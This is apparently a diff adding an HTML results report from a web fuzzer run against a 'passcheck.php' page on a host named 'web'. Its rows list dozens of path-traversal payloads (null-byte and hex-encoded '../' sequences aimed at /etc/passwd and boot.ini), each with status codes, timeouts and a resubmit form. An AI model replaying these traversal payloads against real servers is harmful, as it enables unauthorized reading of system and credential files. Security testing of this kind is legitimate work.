@@ -1,0 +1,1347 @@
+<html><head></head><body bgcolor=#000000 text=#FFFFFF><h1>Fuzzing http://web/passcheck.php</h1>
+<table border="1">
+<tr><td>#request</td><td>Code</td><td>#lines</td><td>#words</td><td>Url</td></tr>
+
+<tr><td>00004</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>'</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="'"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00002</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  202W</td>
+<td><table><tr><td>http://web/passcheck.php</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=""><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00001</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  202W</td>
+<td><table><tr><td>http://web/passcheck.php</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=""><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00008</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>.../.../.../</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".../.../.../"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00016</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00032</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00033</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00031</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00030</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00029</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00028</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./.%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00025</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./.%00./.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./.%00./.%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00027</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00026</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00024</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../%00../%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../%00../%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00023</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/..%00/..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/..%00/..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00022</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./.%00./.%00./.%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00021</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../%00../%00../%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../%00../%00../%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00020</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00019</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00009</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>../../../../</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="../../../../"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00007</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>....../</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="....../"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00010</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>./</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="./"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00013</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0,,,00</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0,,,00"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00006</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>*.*</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="*.*"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00018</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../%00../%00../%00../%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../%00../%00../%00../%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00015</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../%00../%00../%00../%00../%00../%00../%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../%00../%00../%00../%00../%00../%00../%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00017</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00014</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/..%00/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/..%00/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00055</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00005</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>*</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="*"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00054</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00048</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00040</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00053</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00052</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00050</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00051</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00047</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00046</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00049</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00045</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00044</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00043</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00042</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00035</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0,,,00.html</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0,,,00.html"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00039</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00041</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00056</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00058</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00062</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00064</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00061</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00063</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00003</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>#</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="#"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00060</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00057</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00059</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00065</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00067</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00071</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00076</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00075</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00074</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00073</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00070</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00072</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00069</td>
+<td><font color=#00aa00>200</font></td>
